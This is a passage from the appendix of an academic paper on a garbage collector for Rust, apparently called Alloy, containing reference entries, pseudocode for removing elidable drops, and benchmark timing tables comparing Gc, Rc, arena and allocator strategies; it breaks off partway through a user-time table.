  <li id="Xstroustrup97c++">
    <span>[30]</span>
    Bjarne Stroustrup. 1997. <em>The C++ Programming Language</em> (third ed.). Addison-Wesley.
  </li>

  <li id="Xwang06escape">
    <span>[31]</span>
    Lei Wang and Xikun Sun. 2006. Escape analysis for synchronization removal. In <em>SAC</em>. 1419–1423. <a href="https://doi.org/10.1145/1141277.1141607">doi:10.1145/1141277.1141607</a>
  </li>

  <li id="Xgcarena">
    <span>[32]</span>
    Catherine West. 2019. gc-arena: An experimental system for Rust garbage collection. <a href="https://github.com/kyren/gc-arena/">https://github.com/kyren/gc-arena/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xboa">
    <span>[33]</span>
    Jason Williams. 2018. Boa: an experimental JavaScript lexer, parser and interpreter written in Rust. <a href="https://github.com/boa-dev/boa">https://github.com/boa-dev/boa</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xwolff14heaptrack">
    <span>[34]</span>
    Milian Wolff. 2014. Heaptrack - A Heap Memory Profiler for Linux. <a href="https://milianw.de/blog/heaptrack-a-heap-memory-profiler-for-linux.html">https://milianw.de/blog/heaptrack-a-heap-memory-profiler-for-linux.html</a>. Accessed: 2025-03-25.
  </li>

  <li id="Xyanovski21ghostcell">
    <span>[35]</span>
    Joshua Yanovski, Hoang-Hai Dang, Ralf Jung, and Derek Dreyer. 2021. GhostCell: separating permissions from data in Rust. 5 (Aug. 2021), 1–30. <a href="https://doi.org/10.1145/3473597">doi:10.1145/3473597</a>
  </li>
</ol>


<h3>Appendix<a id="x1-30003r3"></a></h3>

<figure>
<pre><code>function RemoveElidableDrops(func):

    for each basic_block ∈ func do
        if IsDropTerminator(basic_block.terminator.kind) then
            ty ← GetTypeOfDroppedValue(block.terminator);
            if IsGcType(ty) then
                if not RequiresFinalizer(ty) then
                    ReplaceTerminator(basic_block);

function ReplaceTerminator(basic_block):

    drop_func ← GetDropFunc(basic_block.terminator);
    last_block ← GetLastBasicBlock(drop_func);
    block.terminator ← last_block.terminator;</code></pre>

<figcaption>
            <p><span>Algorithm 3: </span>
                <span>Removing elidable drops</span></p>
</figcaption>
</figure>

<h3><a id="x1-30007A"></a>Additional Experimental Data</h3>

<figure>
<a id="x1-30029r4"></a>
<table>
<thead>
<tr>
<th>Benchmark</th>
<th>Description</th>
<th>Reason for exclusion</th>
</tr>
</thead>
<tbody>
<tr>
<td><span>bevy</span></td>
<td>ECS game engine in Rust</td>
<td>Unable to port successfully (see Section <a href="#x1-240008.1.2">8.1.2</a>)</td>
</tr>
<tr>
<td><span>dyon</span></td>
<td>Scripting language in Rust</td>
<td>Unable to port successfully (see Section <a href="#x1-240008.1.2">8.1.2</a>)</td>
</tr>
<tr>
<td><span>jiff</span></td>
<td>A datetime library for Rust</td>
<td>Too few allocations to measure</td>
</tr>
<tr>
<td><span>mini-moka</span></td>
<td>Concurrent in-memory cache library</td>
<td>Too few allocations to measure</td>
</tr>
<tr>
<td><span>numbat</span></td>
<td>Math search engine</td>
<td>Too few allocations to measure</td>
</tr>
<tr>
<td><span>rkyv</span></td>
<td>Zero-copy deserialization framework</td>
<td>Insufficient <code>Gc&lt;T&gt;</code> coverage in benchmarks</td>
</tr>
<tr>
<td><span>RustPython</span></td>
<td>Python interpreter written in Rust</td>
<td>Difficulty retro-fitting <code>__del__</code> semantics (see Section <a href="#x1-240008.1.2">8.1.2</a>)</td>
</tr>
<tr>
<td><span>rust-analyzer</span></td>
<td>Language server for Rust</td>
<td>Unable to port successfully (see Section <a href="#x1-240008.1.2">8.1.2</a>)</td>
</tr>
<tr>
<td><span>salsa</span></td>
<td>Incremental recomputation library</td>
<td>Too few allocations to measure</td>
</tr>
<tr>
<td><span>WLambda</span></td>
<td>Scripting language written in Rust</td>
<td>Insufficient <code>Gc&lt;T&gt;</code> coverage in benchmarks</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 4.  </span><span>Rust programs excluded from our benchmark suite after attempted porting to <span>Alloy</span>.</span></figcaption>
</figure>

<figure>
<a id="x1-30030r5"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="4">Wall-clock time (s)</th>
</tr>
<tr>
<th></th>
<th><code>Gc&lt;T&gt;</code></th>
<th><code>Rc&lt;T&gt;</code></th>
<th><code>Gc&lt;T&gt;</code> (<span>Rust-GC</span>)</th>
<th><code>Arena&lt;T&gt;</code></th>
</tr>
</thead>
<tbody>
<tr>
<td><span>Alacritty</span></td>
<td>0.41 [0.39, 0.45]</td>
<td>0.40 [0.38, 0.44]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>Binary Trees</span></td>
<td>0.11 [0.11, 0.11]</td>
<td>0.15 [0.14, 0.15]</td>
<td>0.33 [0.32, 0.33]</td>
<td>0.03 [0.03, 0.04]</td>
</tr>
<tr>
<td><span>fd</span></td>
<td>0.33 [0.29, 0.38]</td>
<td>0.31 [0.26, 0.37]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>grmtools</span></td>
<td>3.06 [3.00, 3.14]</td>
<td>3.24 [3.17, 3.31]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>Regex-Redux</span></td>
<td>0.47 [0.47, 0.47]</td>
<td>0.45 [0.45, 0.46]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>Ripgrep</span></td>
<td>1.61 [1.55, 1.69]</td>
<td>1.52 [1.45, 1.59]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>som-rs-ast</span></td>
<td>0.92 [0.88, 0.95]</td>
<td>0.79 [0.76, 0.82]</td>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td><span>som-rs-bc</span></td>
<td>0.28 [0.27, 0.29]</td>
<td>0.29 [0.28, 0.30]</td>
<td>–</td>
<td>–</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 5.  </span><span>Wall-clock times (in seconds) with 99% confidence intervals for the <span>E<sub>GCvs</sub></span> experiment comparing different memory management strategies. Strategies not supported by a given benchmark are marked with "–".</span></figcaption>
</figure>

<figure>
<a id="x1-30031r6"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="2">Wall-clock time (s)</th>
<th>Ratio</th>
</tr>
<tr>
<th></th>
<th>jemalloc</th>
<th><span>BDWGC</span></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><span>Alacritty</span></td>
<td>0.36 <span>[0.33, 0.40]</span></td>
<td>0.40 <span>[0.38, 0.44]</span></td>
<td>1.11</td>
</tr>
<tr>
<td><span>Binary Trees</span></td>
<td>0.12 <span>[0.12, 0.12]</span></td>
<td>0.15 <span>[0.14, 0.15]</span></td>
<td>1.26</td>
</tr>
<tr>
<td><span>fd</span></td>
<td>0.30 <span>[0.25, 0.36]</span></td>
<td>0.31 <span>[0.26, 0.37]</span></td>
<td>1.02</td>
</tr>
<tr>
<td><span>grmtools</span></td>
<td>3.09 <span>[3.01, 3.17]</span></td>
<td>3.24 <span>[3.17, 3.31]</span></td>
<td>1.05</td>
</tr>
<tr>
<td><span>Regex-Redux</span></td>
<td>0.45 <span>[0.44, 0.45]</span></td>
<td>0.45 <span>[0.45, 0.46]</span></td>
<td>1.01</td>
</tr>
<tr>
<td><span>Ripgrep</span></td>
<td>1.46 <span>[1.40, 1.53]</span></td>
<td>1.52 <span>[1.45, 1.59]</span></td>
<td>1.04</td>
</tr>
<tr>
<td><span>som-rs-ast</span></td>
<td>0.77 <span>[0.74, 0.80]</span></td>
<td>0.79 <span>[0.76, 0.82]</span></td>
<td>1.02</td>
</tr>
<tr>
<td><span>som-rs-bc</span></td>
<td>0.28 <span>[0.27, 0.29]</span></td>
<td>0.29 <span>[0.28, 0.30]</span></td>
<td>1.02</td>
</tr>
</tbody>
</table>
<figcaption><span>Table 6.  </span><span>Wall-clock times comparing jemalloc and <span>BDWGC</span> as allocators for <code>Rc&lt;T&gt;</code>-only code (i.e., no GC). The ratio column shows <span>BDWGC</span> time divided by jemalloc time.</span></figcaption>
</figure>

<figure>
<a id="x1-30032r7"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="3">Wall-clock time (s)</th>
</tr>
<tr>
<th></th>
<th>jemalloc</th>
<th colspan="2"><span>BDWGC</span></th>
</tr>
<tr>
<th></th>
<th><code>Rc&lt;T&gt;</code></th>
<th><code>Gc&lt;T&gt;</code></th>
<th><code>Rc&lt;T&gt;</code></th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="4"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>0.65 <span>±0.02</span></td>
<td>0.66 <span>±0.01</span></td>
<td>0.66 <span>±0.01</span></td>
</tr>
<tr>
<td>Dense Cells</td>
<td>2.16 <span>±0.03</span></td>
<td>2.16 <span>±0.02</span></td>
<td>2.14 <span>±0.04</span></td>
</tr>
<tr>
<td>Light Cells</td>
<td>0.37 <span>±0.01</span></td>
<td>0.37 <span>±0.01</span></td>
<td>0.38 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll</td>
<td>0.25 <span>±0.01</span></td>
<td>0.26 <span>±0.02</span></td>
<td>0.26 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>0.38 <span>±0.01</span></td>
<td>0.39 <span>±0.01</span></td>
<td>0.38 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>0.32 <span>±0.00</span></td>
<td>0.33 <span>±0.00</span></td>
<td>0.32 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>0.32 <span>±0.01</span></td>
<td>0.33 <span>±0.00</span></td>
<td>0.32 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Top</td>
<td>0.25 <span>±0.02</span></td>
<td>0.26 <span>±0.02</span></td>
<td>0.24 <span>±0.02</span></td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>0.32 <span>±0.01</span></td>
<td>0.32 <span>±0.01</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>Unicode</td>
<td>0.23 <span>±0.02</span></td>
<td>0.27 <span>±0.01</span></td>
<td>0.27 <span>±0.02</span></td>
</tr>

<tr data-suite="fd">
<td colspan="4"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>Cmd Exec.</td>
<td>1.29 <span>±0.01</span></td>
<td>1.28 <span>±0.01</span></td>
<td>1.29 <span>±0.02</span></td>
</tr>
<tr>
<td>Cmd Exec. (large)</td>
<td>1.24 <span>±0.01</span></td>
<td>1.25 <span>±0.03</span></td>
<td>1.26 <span>±0.01</span></td>
</tr>
<tr>
<td>File Extension</td>
<td>0.13 <span>±0.00</span></td>
<td>0.15 <span>±0.01</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>File Type</td>
<td>0.12 <span>±0.00</span></td>
<td>0.13 <span>±0.01</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>No Pattern</td>
<td>0.18 <span>±0.00</span></td>
<td>0.29 <span>±0.02</span></td>
<td>0.22 <span>±0.01</span></td>
</tr>
<tr>
<td>Simple</td>
<td>0.27 <span>±0.01</span></td>
<td>0.33 <span>±0.01</span></td>
<td>0.32 <span>±0.00</span></td>
</tr>
<tr>
<td>Simple (-HI)</td>
<td>0.12 <span>±0.00</span></td>
<td>0.15 <span>±0.00</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="4"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>0.62 <span>±0.00</span></td>
<td>0.96 <span>±0.02</span></td>
<td>0.80 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>0.56 <span>±0.01</span></td>
<td>0.84 <span>±0.01</span></td>
<td>0.71 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>0.77 <span>±0.00</span></td>
<td>1.09 <span>±0.01</span></td>
<td>0.98 <span>±0.00</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>0.59 <span>±0.01</span></td>
<td>0.97 <span>±0.00</span></td>
<td>0.77 <span>±0.01</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>0.65 <span>±0.00</span></td>
<td>1.01 <span>±0.06</span></td>
<td>0.81 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>0.83 <span>±0.00</span></td>
<td>1.41 <span>±0.01</span></td>
<td>1.08 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>0.94 <span>±0.00</span></td>
<td>1.20 <span>±0.01</span></td>
<td>1.07 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>0.31 <span>±0.00</span></td>
<td>0.43 <span>±0.01</span></td>
<td>0.38 <span>±0.01</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>0.52 <span>±0.01</span></td>
<td>0.84 <span>±0.00</span></td>
<td>0.67 <span>±0.01</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>0.86 <span>±0.00</span></td>
<td>1.22 <span>±0.01</span></td>
<td>1.10 <span>±0.00</span></td>
</tr>
<tr>
<td>List</td>
<td>0.38 <span>±0.00</span></td>
<td>0.53 <span>±0.01</span></td>
<td>0.48 <span>±0.00</span></td>
</tr>
<tr>
<td>Loop</td>
<td>0.53 <span>±0.01</span></td>
<td>0.86 <span>±0.01</span></td>
<td>0.70 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>0.46 <span>±0.00</span></td>
<td>0.69 <span>±0.01</span></td>
<td>0.57 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>0.31 <span>±0.00</span></td>
<td>0.38 <span>±0.01</span></td>
<td>0.34 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>0.31 <span>±0.00</span></td>
<td>0.44 <span>±0.00</span></td>
<td>0.39 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>0.67 <span>±0.00</span></td>
<td>0.90 <span>±0.02</span></td>
<td>0.82 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>0.77 <span>±0.01</span></td>
<td>1.18 <span>±0.02</span></td>
<td>0.98 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>0.98 <span>±0.00</span></td>
<td>1.27 <span>±0.02</span></td>
<td>1.26 <span>±0.01</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>0.60 <span>±0.00</span></td>
<td>0.92 <span>±0.00</span></td>
<td>0.79 <span>±0.00</span></td>
</tr>
<tr>
<td>Richards</td>
<td>2.48 <span>±0.02</span></td>
<td>3.72 <span>±0.11</span></td>
<td>3.13 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>0.67 <span>±0.00</span></td>
<td>0.94 <span>±0.01</span></td>
<td>0.87 <span>±0.00</span></td>
</tr>
<tr>
<td>Storage</td>
<td>0.56 <span>±0.00</span></td>
<td>0.70 <span>±0.01</span></td>
<td>0.69 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>0.52 <span>±0.01</span></td>
<td>0.83 <span>±0.01</span></td>
<td>0.67 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>0.31 <span>±0.00</span></td>
<td>0.46 <span>±0.01</span></td>
<td>0.38 <span>±0.01</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>0.32 <span>±0.00</span></td>
<td>0.41 <span>±0.01</span></td>
<td>0.40 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>0.48 <span>±0.00</span></td>
<td>0.72 <span>±0.00</span></td>
<td>0.60 <span>±0.00</span></td>
</tr>
<tr data-suite="grmtools">
<td colspan="4"><span>grmtools</span> <span>▶</span></td>
</tr>
<tr>
<td>Eclipse</td>
<td>3.48 <span>±0.03</span></td>
<td>3.44 <span>±0.03</span></td>
<td>3.74 <span>±0.04</span></td>
</tr>
<tr>
<td>Hadoop</td>
<td>2.86 <span>±0.01</span></td>
<td>2.92 <span>±0.01</span></td>
<td>3.09 <span>±0.01</span></td>
</tr>
<tr>
<td>Jenkins</td>
<td>2.90 <span>±0.00</span></td>
<td>2.99 <span>±0.05</span></td>
<td>3.02 <span>±0.01</span></td>
</tr>
<tr>
<td>Spring</td>
<td>2.43 <span>±0.00</span></td>
<td>2.51 <span>±0.01</span></td>
<td>2.63 <span>±0.02</span></td>
</tr>

<tr data-suite="ripgrep">
<td colspan="4"><span>Ripgrep</span> <span>▶</span></td>
</tr>
<tr>
<td>Alternates</td>
<td>1.18 <span>±0.01</span></td>
<td>1.29 <span>±0.02</span></td>
<td>1.21 <span>±0.01</span></td>
</tr>
<tr>
<td>Alternates (-i)</td>
<td>1.31 <span>±0.01</span></td>
<td>1.42 <span>±0.01</span></td>
<td>1.33 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal</td>
<td>1.12 <span>±0.01</span></td>
<td>1.23 <span>±0.01</span></td>
<td>1.15 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (-i)</td>
<td>1.19 <span>±0.00</span></td>
<td>1.27 <span>±0.01</span></td>
<td>1.20 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (default)</td>
<td>1.08 <span>±0.01</span></td>
<td>1.19 <span>±0.01</span></td>
<td>1.10 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (mmap)</td>
<td>1.64 <span>±0.01</span></td>
<td>1.75 <span>±0.02</span></td>
<td>1.67 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (mmap, -i)</td>
<td>1.67 <span>±0.01</span></td>
<td>1.80 <span>±0.01</span></td>
<td>1.72 <span>±0.01</span></td>
</tr>
<tr>
<td>Literal (regex)</td>
<td>1.13 <span>±0.01</span></td>
<td>1.25 <span>±0.01</span></td>
<td>1.15 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Greek</td>
<td>3.29 <span>±0.01</span></td>
<td>3.41 <span>±0.01</span></td>
<td>3.33 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Greek (-i)</td>
<td>3.30 <span>±0.01</span></td>
<td>3.42 <span>±0.03</span></td>
<td>3.33 <span>±0.01</span></td>
</tr>
<tr>
<td>UTF Word</td>
<td>1.09 <span>±0.01</span></td>
<td>1.21 <span>±0.01</span></td>
<td>1.14 <span>±0.00</span></td>
</tr>
<tr>
<td>UTF Word (alt.)</td>
<td>1.11 <span>±0.01</span></td>
<td>1.21 <span>±0.01</span></td>
<td>1.13 <span>±0.00</span></td>
</tr>
<tr>
<td>Word</td>
<td>1.12 <span>±0.00</span></td>
<td>1.22 <span>±0.02</span></td>
<td>1.14 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-bc">
<td colspan="4"><span>som-rs-bc</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>0.25 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
<td>0.30 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>0.23 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>0.30 <span>±0.00</span></td>
<td>0.34 <span>±0.00</span></td>
<td>0.36 <span>±0.00</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>0.25 <span>±0.00</span></td>
<td>0.28 <span>±0.00</span></td>
<td>0.29 <span>±0.01</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>0.25 <span>±0.00</span></td>
<td>0.29 <span>±0.00</span></td>
<td>0.29 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>0.30 <span>±0.01</span></td>
<td>0.37 <span>±0.00</span></td>
<td>0.36 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>0.49 <span>±0.00</span></td>
<td>0.43 <span>±0.00</span></td>
<td>0.54 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>0.12 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
<td>0.15 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>0.22 <span>±0.00</span></td>
<td>0.24 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>0.37 <span>±0.00</span></td>
<td>0.39 <span>±0.01</span></td>
<td>0.44 <span>±0.00</span></td>
</tr>
<tr>
<td>List</td>
<td>0.18 <span>±0.00</span></td>
<td>0.22 <span>±0.00</span></td>
<td>0.21 <span>±0.01</span></td>
</tr>
<tr>
<td>Loop</td>
<td>0.23 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>0.20 <span>±0.00</span></td>
<td>0.22 <span>±0.01</span></td>
<td>0.23 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>0.11 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>0.13 <span>±0.00</span></td>
<td>0.13 <span>±0.00</span></td>
<td>0.14 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>0.24 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>0.28 <span>±0.01</span></td>
<td>0.33 <span>±0.00</span></td>
<td>0.33 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>0.36 <span>±0.00</span></td>
<td>0.38 <span>±0.00</span></td>
<td>0.43 <span>±0.00</span></td>
</tr>
<tr>
<td>Recurse</td>
<td>0.25 <span>±0.00</span></td>
<td>0.31 <span>±0.00</span></td>
<td>0.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Richards</td>
<td>0.92 <span>±0.00</span></td>
<td>1.20 <span>±0.01</span></td>
<td>1.10 <span>±0.01</span></td>
</tr>
<tr>
<td>Sieve</td>
<td>0.25 <span>±0.00</span></td>
<td>0.26 <span>±0.00</span></td>
<td>0.30 <span>±0.01</span></td>
</tr>
<tr>
<td>Storage</td>
<td>0.22 <span>±0.00</span></td>
<td>0.21 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
</tr>
<tr>
<td>Sum</td>
<td>0.22 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
<td>0.27 <span>±0.00</span></td>
</tr>
<tr>
<td>Towers</td>
<td>0.13 <span>±0.00</span></td>
<td>0.15 <span>±0.00</span></td>
<td>0.15 <span>±0.00</span></td>
</tr>
<tr>
<td>TreeSort</td>
<td>0.11 <span>±0.00</span></td>
<td>0.12 <span>±0.00</span></td>
<td>0.13 <span>±0.00</span></td>
</tr>
<tr>
<td>WhileLoop</td>
<td>0.22 <span>±0.00</span></td>
<td>0.23 <span>±0.00</span></td>
<td>0.25 <span>±0.00</span></td>
</tr>
</tbody>
</table>
<figcaption><span>Table 7.  </span><span>Wall-clock execution times (in seconds) for each benchmark in the <span>E<sub>GCvs</sub></span> experiment. Values show arithmetic means over 30 runs and include 99% confidence intervals. Because <span>Binary Trees</span> and <span>Regex-Redux</span> are stand-alone benchmarks they are omitted here; their timings appear in Table <a href="#x1-30030r5">5</a>.</span></figcaption>
</figure>

<figure>
<a id="x1-30033r8"></a>
<table>
<thead>
<tr>
<th></th>
<th colspan="3">User time (s)</th>
</tr>
<tr>
<th></th>
<th>jemalloc</th>
<th colspan="2"><span>BDWGC</span></th>
</tr>
<tr>
<th></th>
<th><code>Rc&lt;T&gt;</code></th>
<th><code>Gc&lt;T&gt;</code></th>
<th><code>Rc&lt;T&gt;</code></th>
</tr>
</thead>
<tbody>
<tr data-suite="alacritty">
<td colspan="4"><span>Alacritty</span> <span>▶</span></td>
</tr>
<tr>
<td>Cur. Motion</td>
<td>1.08 <span>±0.05</span></td>
<td>1.09 <span>±0.04</span></td>
<td>1.09 <span>±0.04</span></td>
</tr>
<tr>
<td>Dense Cells</td>
<td>6.66 <span>±0.13</span></td>
<td>6.62 <span>±0.12</span></td>
<td>6.58 <span>±0.15</span></td>
</tr>
<tr>
<td>Light Cells</td>
<td>0.34 <span>±0.03</span></td>
<td>0.34 <span>±0.03</span></td>
<td>0.34 <span>±0.03</span></td>
</tr>
<tr>
<td>Scroll</td>
<td>0.11 <span>±0.01</span></td>
<td>0.11 <span>±0.01</span></td>
<td>0.12 <span>±0.02</span></td>
</tr>
<tr>
<td>Scroll (fullscreen)</td>
<td>0.24 <span>±0.02</span></td>
<td>0.28 <span>±0.03</span></td>
<td>0.22 <span>±0.02</span></td>
</tr>
<tr>
<td>Scroll Btm</td>
<td>0.14 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Btm (small)</td>
<td>0.14 <span>±0.01</span></td>
<td>0.15 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Top</td>
<td>0.12 <span>±0.01</span></td>
<td>0.12 <span>±0.02</span></td>
<td>0.11 <span>±0.01</span></td>
</tr>
<tr>
<td>Scroll Top (small)</td>
<td>0.14 <span>±0.01</span></td>
<td>0.14 <span>±0.01</span></td>
<td>0.15 <span>±0.01</span></td>
</tr>
<tr>
<td>Unicode</td>
<td>0.10 <span>±0.01</span></td>
<td>0.13 <span>±0.01</span></td>
<td>0.12 <span>±0.01</span></td>
</tr>

<tr data-suite="fd">
<td colspan="4"><span>fd</span> <span>▶</span></td>
</tr>
<tr>
<td>Cmd Exec.</td>
<td>1.05 <span>±0.01</span></td>
<td>1.12 <span>±0.02</span></td>
<td>1.12 <span>±0.02</span></td>
</tr>
<tr>
<td>Cmd Exec. (large)</td>
<td>1.02 <span>±0.01</span></td>
<td>1.10 <span>±0.03</span></td>
<td>1.11 <span>±0.02</span></td>
</tr>
<tr>
<td>File Extension</td>
<td>0.04 <span>±0.00</span></td>
<td>0.04 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
</tr>
<tr>
<td>File Type</td>
<td>0.03 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
</tr>
<tr>
<td>No Pattern</td>
<td>0.16 <span>±0.01</span></td>
<td>0.29 <span>±0.02</span></td>
<td>0.23 <span>±0.01</span></td>
</tr>
<tr>
<td>Simple</td>
<td>0.14 <span>±0.01</span></td>
<td>0.18 <span>±0.01</span></td>
<td>0.16 <span>±0.01</span></td>
</tr>
<tr>
<td>Simple (-HI)</td>
<td>0.03 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
<td>0.04 <span>±0.01</span></td>
</tr>

<tr data-suite="som-rs-ast">
<td colspan="4"><span>som-rs-ast</span> <span>▶</span></td>
</tr>
<tr>
<td>Bounce</td>
<td>0.62 <span>±0.00</span></td>
<td>0.96 <span>±0.02</span></td>
<td>0.79 <span>±0.00</span></td>
</tr>
<tr>
<td>BubbleSort</td>
<td>0.56 <span>±0.00</span></td>
<td>0.83 <span>±0.01</span></td>
<td>0.71 <span>±0.00</span></td>
</tr>
<tr>
<td>DeltaBlue</td>
<td>0.77 <span>±0.00</span></td>
<td>1.07 <span>±0.01</span></td>
<td>0.97 <span>±0.00</span></td>
</tr>
<tr>
<td>Dispatch</td>
<td>0.59 <span>±0.01</span></td>
<td>0.96 <span>±0.01</span></td>
<td>0.76 <span>±0.01</span></td>
</tr>
<tr>
<td>Fannkuch</td>
<td>0.64 <span>±0.00</span></td>
<td>0.98 <span>±0.05</span></td>
<td>0.80 <span>±0.00</span></td>
</tr>
<tr>
<td>Fibonacci</td>
<td>0.82 <span>±0.00</span></td>
<td>1.40 <span>±0.01</span></td>
<td>1.07 <span>±0.00</span></td>
</tr>
<tr>
<td>FieldLoop</td>
<td>0.94 <span>±0.00</span></td>
<td>1.20 <span>±0.01</span></td>
<td>1.07 <span>±0.01</span></td>
</tr>
<tr>
<td>GraphSearch</td>
<td>0.30 <span>±0.00</span></td>
<td>0.41 <span>±0.01</span></td>
<td>0.37 <span>±0.00</span></td>
</tr>
<tr>
<td>IntegerLoop</td>
<td>0.52 <span>±0.01</span></td>
<td>0.83 <span>±0.00</span></td>
<td>0.66 <span>±0.01</span></td>
</tr>
<tr>
<td>JsonSmall</td>
<td>0.85 <span>±0.00</span></td>
<td>1.21 <span>±0.01</span></td>
<td>1.10 <span>±0.00</span></td>
</tr>
<tr>
<td>List</td>
<td>0.38 <span>±0.00</span></td>
<td>0.52 <span>±0.01</span></td>
<td>0.47 <span>±0.00</span></td>
</tr>
<tr>
<td>Loop</td>
<td>0.52 <span>±0.01</span></td>
<td>0.85 <span>±0.01</span></td>
<td>0.70 <span>±0.00</span></td>
</tr>
<tr>
<td>Mandelbrot</td>
<td>0.45 <span>±0.00</span></td>
<td>0.69 <span>±0.01</span></td>
<td>0.57 <span>±0.00</span></td>
</tr>
<tr>
<td>NBody</td>
<td>0.31 <span>±0.00</span></td>
<td>0.38 <span>±0.01</span></td>
<td>0.34 <span>±0.00</span></td>
</tr>
<tr>
<td>PageRank</td>
<td>0.30 <span>±0.00</span></td>
<td>0.43 <span>±0.01</span></td>
<td>0.38 <span>±0.00</span></td>
</tr>
<tr>
<td>Permute</td>
<td>0.66 <span>±0.00</span></td>
<td>0.89 <span>±0.02</span></td>
<td>0.82 <span>±0.00</span></td>
</tr>
<tr>
<td>Queens</td>
<td>0.77 <span>±0.00</span></td>
<td>1.18 <span>±0.02</span></td>
<td>0.97 <span>±0.00</span></td>
</tr>
<tr>
<td>QuickSort</td>
<td>0.98 <span>±0.00</span></td>
